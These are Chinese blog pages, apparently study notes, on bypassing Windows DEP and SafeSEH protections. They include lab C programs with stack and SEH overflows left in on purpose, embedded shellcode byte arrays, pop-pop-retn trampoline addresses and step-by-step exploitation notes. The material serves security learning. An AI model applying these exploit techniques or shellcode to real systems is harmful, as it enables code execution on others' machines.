+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+void test()
+{
+    char str[176];
+    //__asm int 3
+    memcpy(str, shellcode, 500);
+}
+
+int main()
+{
+    HINSTANCE hInst = LoadLibrary("shell32.dll");
+    char temp[200];
+    test();
+    return 0;
+}
+</code></pre>
+
+<h4 id="3-3-实验内容"><a href="#3-3-实验内容" class="headerlink" title="3.3 实验内容"></a>3.3 实验内容</h4><p><b>实验思路</b></p>
+<ol>
+<li>不启用GS和SafeSEH</li>
+<li>test存在典型的溢出</li>
+<li>通过覆盖范返回地址，运用Ret2Libc技术，利用VirtualAlloc函数申请一段具有可执行权限的内存</li>
+<li>通过memcpy函数将shellcode复制到VirtualAlloc函数申请的可执行内存空间中</li>
+<li>最后在这段可执行的内存空间中执行shellcode，实现DEP绕过</li>
+</ol>
+<p><b>实验环境</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows 2003 SP2</td>
+<td></td>
+</tr>
+<tr>
+<td>DEP状态</td>
+<td>Optout</td>
+<td></td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>VC 6.0</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td>禁用优化选项</td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>debug版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>VirtualAlloc函数的具体实现</b><br><img src="/images/2017-07-09/virtualalloc.jpg" alt="virtualalloc实现流程"></p>
+<p>类似VirtualProtect，我们选择0x7C8245BC（CALL VirtualAllocEx）处作为切入点。</p>
+<pre><code>lpAddress=0x00030000
+dwSize=0xFF
+flAllocationType=0x00001000
+flProtect=0x00000040
+</code></pre>
+
+<p>当执行到call VirtualAllocEx地址后，发现如图所示的内容：<br><img src="/images/2017-7-09/virtualalloc2.jpg" alt="申请空间之后"><br>从图中可以看出eax=0x00030000，这说明我们申请到了空间。</p>
+<p>而memcpy函数位于ntdll.dll，需要三个参数，分别为目的内存起始地址、源内存起始地址、复制长度。其中目的内存地址和复制长度可以直接写在shellcode中，但是源内存起始地址不好确定，所以使用push esp jmp eax指令来填充这个参数。</p>
+<p><img src="/images/2017-07-09/memcpy.jpg" alt="memcpy运行结构"></p>
+<p>根据图片可以看出， memcpy中的源地址放在了EBP+0xC，目的地址为EBP+0x10，长度为EBP+0x8。所以后面的工作就是将这三个位置进行赋值，采用Ret2Libc的方式，对这些位置进行赋值。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/09/0day/DEP机制的保护原理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/09/0day/DEP机制的保护原理/" itemprop="url">DEP机制的保护原理</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-09T17:35:51+08:00">
+                2017-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-DEP简介"><a href="#1-DEP简介" class="headerlink" title="1. DEP简介"></a>1. DEP简介</h3><p>溢出攻击的根源是现代计算机对数据和代码没有明确区分。而重新设计计算机体系结构基本上不可能，所以只能向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护， Data Execution Prevention）设计弥补这一缺陷。</p>
+<p>DEP基本原理是将数据所在的页面标识设置为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据基本页面上执行指令，此时CPU会抛出异常，而不是执行恶意指令。</p>
+<p>DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。从Windows XP SP2开始有，分为：软件DEP(Software DEP)和硬件DEP(Hardware-enforeced DEP)</p>
+<p>软件DEP就是SafeSEH。</p>
+<p>硬件DEP：需要CPU支持，AMD称为No-Execute Page-Protection(NX)、Intel称为Execute Disable Bit(XD)。操作系统通过设置内存页的NX/XD属性标记，来指明是否可以从该内存中执行代码。所以页面表(Page Table)中需要加入特殊标识位(NX/XD)，若其为0表示页面允许执行，为1表示不允许执行。</p>
+<h3 id="2-判断机器上是否允许DEP"><a href="#2-判断机器上是否允许DEP" class="headerlink" title="2. 判断机器上是否允许DEP"></a>2. 判断机器上是否允许DEP</h3><p>我的电脑-&gt;属性-&gt;系统属性-&gt;高级-&gt;性能-&gt;设置-&gt;性能选项-&gt;数据执行保护。</p>
+<p>若CPU不支持硬件DEP，该页面底部会有提示&quot;您的计算机的处理器不支持基于硬件的DEP，但是，Windows可以使用DEP软件帮助保护免受某些类型的攻击&quot;</p>
+<h3 id="3-DEP的四种工作状态"><a href="#3-DEP的四种工作状态" class="headerlink" title="3. DEP的四种工作状态"></a>3. DEP的四种工作状态</h3><ol>
+<li>Optin：默认仅将DEP保护用于Windows系统组件和服务，对于其他程序不予保护，但用户可以通过应用程序兼容性工具（ACT，Application Compatibility Toolkit）为选定的程序启用DEP，在Vista下边经过/NXcompat选项编译过的程序将自动应用DEP。这种状态可以被应用程序动态关闭，它多用于普通用户版操作系统：Windows XP、Windows Vista、Windows 7</li>
+<li>Optout：为排除列表程序外的所有程序和服务启用DEP，用户可以手动在排除列表中指定不启用DEP保护的程序和服务。这种状态可以被动态关闭，多用于服务器版操作系统：windows 2003、windows 2008</li>
+<li>AlwaysOn：对所有进程启用DEP的保护，不存在排序列表，这种模式下，DEP不可以被关闭，目前只有64位操作系统上才工作在AlwaysOn模式</li>
+<li>AlwaysOff：对所有进程都禁用DEP，在这种模式下，DEP也不能被动态开启，这种模式一般只有在某种特定场合才使用，如DEP干扰到程序的正常运行</li>
+</ol>
+<h3 id="4-设置DEP"><a href="#4-设置DEP" class="headerlink" title="4. 设置DEP"></a>4. 设置DEP</h3><p><b>机器上设置DEP</b><br>在C:\boot.ini中设置：</p>
+<ol>
+<li>设置DEP关闭: /execute=optin /fastdetect</li>
+<li>设置DEP工作模式： /noexecute=optout /fastdetect</li>
+</ol>
+<p><b>编译器中设置链接选项</b></p>
+<ol>
+<li>Visual Studio 2005及其后续版本引入了链接选项/NXCOMPAT，默认为开启</li>
+<li>Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT</li>
+</ol>
+<p>采用/NXCOMPAT编译的程序会在PE头中设置IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识，该标识通过结构体IMAGE_OPTIONAL_HEADER中DllCharacteristics变量进行体现，当DllCharacteristics设置为0x100表示程序采用/NXCOMPAT编译。</p>
+<h3 id="5-DEP的局限性"><a href="#5-DEP的局限性" class="headerlink" title="5. DEP的局限性"></a>5. DEP的局限性</h3><ol>
+<li>硬件DEP需要CPU支持</li>
+<li>由于兼容性原因Windows不能对所有进程开启DEP保护，否则会出现异常。例如第三方的插件DLL，由于无法确认其是否开启DEP，对这些DLL程序不能贸然开启DEP保护；使用ATL 7.1或者以前版本的程序需要在数据页面上产生可执行代码，这时就不能启用DEP保护，否则会出现异常</li>
+<li>/NXCOMPAT编译选项，或者IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识的设置，只对Windows Vista以上的系统有效。也就是说，即使采用了这种链接选项，在某些操作系统上也不会自动启用DEP保护。</li>
+<li>DEP工作在Optin和Optout下时，DEP可以被动态关闭或开启。操作系统中某些API函数可控制DEP状态，而它们在早期的操作系统中对这些API函数的调用没设置线坠。</li>
+</ol>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/08/0day/绕过SafeSEH的方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/08/0day/绕过SafeSEH的方法/" itemprop="url">绕过SafeSEH的方法</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-08T10:01:51+08:00">
+                2017-07-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-攻击返回地址绕过SafeSEH"><a href="#1-攻击返回地址绕过SafeSEH" class="headerlink" title="1. 攻击返回地址绕过SafeSEH"></a>1. 攻击返回地址绕过SafeSEH</h3><p>在<a href="/2017/06/22/栈溢出原理与实践/">《栈溢出原理与实践》</a>中有介绍</p>
+<h3 id="2-利用虚函数绕过SafeSEH"><a href="#2-利用虚函数绕过SafeSEH" class="headerlink" title="2. 利用虚函数绕过SafeSEH"></a>2. 利用虚函数绕过SafeSEH</h3><p>在<a href="/2017/07/04/绕过GS安全编译的方法/">《绕过GS安全编译的方法》</a>中有范例</p>
+<h3 id="3-从堆中绕过SafeSEH"><a href="#3-从堆中绕过SafeSEH" class="headerlink" title="3. 从堆中绕过SafeSEH"></a>3. 从堆中绕过SafeSEH</h3><h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><pre><code>
+#include "stdafx.h"
+#include "stdlib.h"
+#include "string.h"
+
+char shellcode[] =
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xB8\x28\x39\x00";
+
+void test(char *input)
+{
+    char str[200];
+    strcpy(str, input);
+    int zero = 0;
+    zero = 1/zero;
+}
+
+void main()
+{
+    char * buf = (char *)malloc(500);
+    //__asm int 3
+    strcpy(buf, shellcode);
+    test(shellcode);
+}
+</code></pre>
+
+<h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>首先从堆中申请500字节的空间，用来存放shellcode</li>
+<li>函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息</li>
+<li>用shellcode在堆中的起始位置覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，进而跳转到堆中的shellcode执行</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td>DEP关闭</td>
+</tr>
+<tr>
+<td>编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>得到的数据</b><br>申请的堆空间起始地址:0x003928B8<br>复制给str后的栈起始地址：0x0012FE9C<br>离栈顶最近的SEH处理函数句柄：0x0012FFB0+4</p>
+<p><b>于是得到shellcode：</b></p>
+<ol>
+<li>168字节的谈对对话框机器码</li>
+<li>112 * &quot;\x90&quot;</li>
+<li>堆起始地址: 0x003928B8</li>
+</ol>
+<h3 id="4-利用未启用SafeSEH模块绕过SafeSEH"><a href="#4-利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="4. 利用未启用SafeSEH模块绕过SafeSEH"></a>4. 利用未启用SafeSEH模块绕过SafeSEH</h3><font color="#f00">如果模块未启用SafeSEH，并且模块不是仅包含中间语言IL，这个异常处理就可以被执行。所以若能找到一个不启用SafeSEH的dll，然后加载之后通过它里面的指令作为跳板实现SafeSEH的绕过。</font>
+
+<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><pre><code>
+#include "stdafx.h"
+#include "string.h"
+#include "windows.h"
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x68"
+    "\xf1\x21\x12\x11"
+    "\x90\x90\x90\x68\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
+
+DWORD MyException(void)
+{
+    printf("There is an exception");
+    getchar();
+    return 1;
+}
+
+void test(char *input)
+{
+    char str[200];
+    strcpy(str, input);
+    int zero = 0;
+    __try{
+        zero = 1/zero;
+    }
+    __except(MyException()){}
+}
+
+int _tmain(int argc, _TCHAR *argv[])
+{
+    // Load NO_SafeSEH Module
+    HINSTANCE hInst = LoadLibrary(_T("SEH_NOSafeSEH_JUMP.dll"));
+    char str[200];
+    //__asm int 3
+    test(shellcode);
+    return 0;
+}
+</code></pre>
+
+<h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p><b>实验思路：</b></p>
+<ol>
+<li>用VC++ 6.0编译一个不是用SafeSEH的动态链接库SEH_NOSafeSEH_JUMP.DLL，然后由启用SafeSEH的应用程序SEH_NOSafeSEH.EXE去加载</li>
+<li>SEH_NOSafeSEH中的test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息</li>
+<li>使用SEH_NOSafeSEH_JUMP.DLL中的&quot;pop pop retn&quot;指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行。</li>
+</ol>
+<p><b>实验环境：</b></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>推荐使用环境</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作系统</td>
+<td>Windows XP SP3</td>
+<td>DEP关闭</td>
+</tr>
+<tr>
+<td>EXE编译器</td>
+<td>Visual Studio 2008</td>
+<td></td>
+</tr>
+<tr>
+<td>DLL编译器</td>
+<td>VC++ 6.0</td>
+<td>将dll基址设为0x11120000</td>
+</tr>
+<tr>
+<td>编译选项</td>
+<td><font color="#f00">禁用优化选项</font></td>
+<td></td>
+</tr>
+<tr>
+<td>build版本</td>
+<td>release版本</td>
+</tr>
+</tbody>
+</table>
+<p><b>编译DLL</b></p>
+<ol>
+<li>在VC++ 6.0新建“Win32 Dynamic-Link Library”工程，创建一个<font color="#f00">简单的DLL工程</font></li>
+<li>按照实验代码编写对应的cpp文件</li>
+<li>由于VC++ 6.0默认编译的DLL文件加载地址为0x10000000，如果其作为DLL加载地址可能会包含0x00，这会导致strcpy字符串截断，所以为方便测试，需要重新设置基址。&quot;工程-&gt;设置-&gt;连接选显卡&quot;，在&quot;工程选项&quot;输入框中添加&quot;/base:&quot;0x11120000&quot;&quot;<br><img src="/images/2017-07-08/dll_setting.jpg" alt="编译DLL的图"></li>
+</ol>
+<p><b>OllySSEH插件说明</b><br>对于SafeSEH描述分为以下四种，如图所示</p>
+<ol>
+<li>/SafeSEH OFF: 未启用SafeSEH，这种模式可作为跳板</li>
+<li>/SafeSEH ON：启用SafeSEH，可以使用右键点击查看SEH注册情况</li>
+<li>NO SEH：不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，所以不能作为跳板</li>
+<li>Erro：读取错误</li>
+</ol>
+<p><img src="/images/2017-07-08/ollysseh.jpg" alt="ollysseh描述图"></p>
+<p><b>后续操作</b></p>
+<ol>
+<li>在SEH_NOSafeSEH_JUMP.DLL中找到&quot;pop pop retn&quot;序列。非常蛋疼的是明明在dll文件中写入一个函数&quot;pop eax, pop eax, retn&quot;，但是在编译的时候就找不到了。不过dll文件中存在&quot;pop ecx, pop ecx, retn&quot;这样原始序列，我们也可以拿来使用，位置为0x111221F1</li>
+<li>溢出字符串起始位置0x0012FDB8<br>最近的异常处理函数句柄0x0012FE90+4</li>
+<li>VS 2008编译的程序，在进入含有\_\<em>try{}的函数时会在Security Cookie+4的位置压入-2（VC++ 6.0下为-1），在程序进入\</em>\<em>try{}区域时程序会根据该\</em>\<em>try{}块在函数中的位置而修改成不同的值（第一层try会将这个值修改为0， 第二层会将这个值修改1）。如果\</em>\<em>try{}块中出现异常，程序会根据这个值调用相应的\</em>\<em>except()处理，处理结束后这个位置的值会重新修改为-2；如果每发生异常，程序会在离开\</em>\_try{}块时这个值也会被修改回-2。</li>
+<li>由于上面的操作，如果将shellcode放在前面的话可能会对弹出对话框的造成破坏，所以将弹出对话框的机器码放在了最后</li>
+</ol>
+<p><br><br><b>shellcode组成</b></p>
+<ol>
+<li>220 * &quot;\x90&quot;</li>
+<li>&quot;pop pop retn&quot;地址0x111221F1</li>
+<li>16 * &quot;\x90&quot;</li>
+<li>168字节的弹出对话框机器码<br><br></li>
+</ol>
+<h4 id="4-3-验证及其思考"><a href="#4-3-验证及其思考" class="headerlink" title="4.3 验证及其思考"></a>4.3 验证及其思考</h4><p><br><br>由于用上面的shellcode无法正常出现弹框，所以我花了半天时间来解决这中间的问题！</p>
+<p><b><font color="#f00">Ollydbg如何调试SEH？</font></b><font color="#0f0"></font></p>
+<ol>
+<li>首先程序运行到出错的汇编代码处，然后两次&quot;Shift+F7&quot;进入错误判断程序</li>
+<li>然后通过SEH Chain窗口，获取离栈顶最近的SEH，双击跳转至该地址，&quot;F2&quot;设置断点</li>
+<li>最后直接&quot;F9&quot;跳转至该位置<br></li>
+</ol>
+<p><img src="/images/2017-07-08/seh1.jpg" alt="第一次SEH处理句柄"></p>
+<p><b><font color="#f00">&quot;pop pop retn&quot;作为异常处理函数所做的工作</font></b><font color="#0f0"></font></p>
+<ol>
+<li>首先，弹出异常判断回去的指针</li>
+<li>然后弹出原始栈顶中的一位参数</li>
+<li>最后返回离栈顶最近的SEH的链表指针所在地址(而不是函数处理句柄)【有时候由于没有中间的参数，而导致返回的是函数处理句柄】<br></li>
+</ol>
+<p><img src="/images/2017-07-08/seh2.jpg" alt="进入shellcode"></p>
+<p>从上面的图片可以看出，2112被解析成&quot;AND DWORD PTR DS:[EDX],EDX&quot;，而EDX是不能被修改的，所以出错，后面的指令也陆续发生错误！</p>
+<p><font color="#f00">解决办法：修改SEH链表指针&quot;\x90\x90\x90\x90&quot;。</font></p>
+<p><font color="#f00">本人尝试了很多办法，最后使用的将0x111221F1作为push的参数压入栈中</font><br><img src="/images/2017-07-08/seh3.jpg" alt="修改后的结果"></p>
+<p>紧接着的数据本来是&quot;\x90\x90\x90\x90&quot;，但是可能中间的某些操作导致该数据被修改为0000，可以使用同样的办法，将其压入栈中</p>
+<p><b>最终的shellcode组成</b></p>
+<ol>
+<li>219 * &quot;\x90&quot; + &quot;\x68&quot;</li>
+<li>&quot;pop pop retn&quot;地址0x111221F1</li>
+<li>3 * &quot;\x90&quot; + &quot;\x68&quot; + 12 * &quot;\x90&quot;</li>
+<li>168字节的弹出对话框机器码</li>
+</ol>
+<p><br></p>
+<h3 id="5-利用加载模块之外的地址绕过SafeSEH"><a href="#5-利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="5. 利用加载模块之外的地址绕过SafeSEH"></a>5. 利用加载模块之外的地址绕过SafeSEH</h3><p><br><br>OllyDbg调试时，用&quot;view-&gt;memory&quot;可以查看程序的映射状态。类型为&quot;Map&quot;的映射文件，SafeSEH是无视的。当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的。如果可以在这些文件中找到跳板指令，就可以绕过SafeSEH。</p>
+<pre><code>
+其实除了"pop pop retn"指令序列外，一下指令也可以使用：
+call/jmp dword ptr [esp+0x8]
+call/jmp dword ptr [esp+0x14]
+call/jmp dword ptr [esp+0x1c]
+call/jmp dword ptr [esp+0x2c]
+call/jmp dword ptr [esp+0x44]
+call/jmp dword ptr [esp+0x50]
+call/jmp dword ptr [ebp+0xc]
+call/jmp dword ptr [ebp+0x24]
+call/jmp dword ptr [ebp+0x30]
+call/jmp dword ptr [ebp-0x4]
+call/jmp dword ptr [ebp-0xc]
+call/jmp dword ptr [ebp-0x18]
+
+</code></pre>
+
+<h4 id="5-1-实验代码"><a href="#5-1-实验代码" class="headerlink" title="5.1 实验代码"></a>5.1 实验代码</h4><pre><code>
+#include "stdafx.h"
+#include "string.h"
+#include "windows.h"
+
+char shellcode[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"
+    "\xEB\xF6\x90\x90"
+    "\x0B\x0B\x28\x00";
+
+DWORD MyException(void)
+{
